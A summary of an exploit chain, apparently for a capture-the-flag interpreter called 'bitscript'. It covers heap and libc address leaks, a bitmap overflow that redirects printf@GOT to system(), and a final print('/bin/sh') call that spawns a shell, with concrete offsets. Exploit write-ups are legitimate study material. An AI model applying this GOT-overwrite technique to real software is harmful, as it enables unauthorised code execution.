# RCE Exploit - Final Summary

## âœ… Complete Exploit Chain

### Step 1: Leak Heap Addresses
```bitscript
int leak1 = 0;
string leak1 = "first";
int addr1 = leak1;  // Leaks heap address
```

### Step 2: Leak Libc Address
```bitscript
string v2 = "BBBBBBBB";
int v2 = 4231312;
int leaked = length(v2);  // Leaks setvbuf address
```

### Step 3: Calculate Addresses
- **Variable entry:** `targetaddr - 768` (0x300)
- **value_ptr:** `entryaddr + 40` (0x28)
- **Bitmap buffer:** `addr1 - 4096` (0x1000)
- **bit_index:** `(valueptraddr - bitmapptr) * 8`

### Step 4: Corrupt Variable Entry
- Use bitmap overflow to write `printf@GOT` (0x409048) to `value_ptr`
- 64 `set()` calls starting at calculated `bit_index`

### Step 5: Verify Corruption
- Read `target` variable
- Should return printf address from libc

### Step 6: Write system() to GOT
- Calculate: `system_addr = leaked - 0x88550 + 0x58750`
- Write: `target = system_addr`
- This writes `system_addr` to `printf@GOT`

### Step 7: Trigger Shell
```bitscript
print("/bin/sh");  // Calls system("/bin/sh")
```

## Files

- **`rce_exploit_final_working.bs`** - Complete exploit script
- **`rce_final_exploit.bs`** - Alternative version with hardcoded values

## Notes

1. **Bit Index Calculation:** The script calculates `bitindex` and prints it. If it matches 29376, the hardcoded values are correct. If not, adjust the `set()` calls accordingly.

2. **System Address:** Currently uses placeholder. In real exploit, calculate from leaked libc:
   - `libc_base = leaked - 0x88550`
   - `system_addr = libc_base + 0x58750`

3. **Bitmap Buffer Location:** Assumes `bitmap_data_ptr = addr1 - 0x1000`. If this doesn't work, try:
   - `addr1 - 0x2000` (bit_index = 59712)
   - `addr1 - 0x500` (bit_index = 4416)

4. **Verification:** After Step 4, reading `target` should return a libc address (printf). If it returns the original string address or 0, the corruption didn't work.

## Next Steps

1. Run `rce_exploit_final_working.bs`
2. Check if `bit_index` matches 29376
3. Verify corruption returns libc address
4. Calculate actual `system_addr` from leaked libc
5. Write `system_addr` to GOT
6. Trigger shell

The exploit is ready to test!

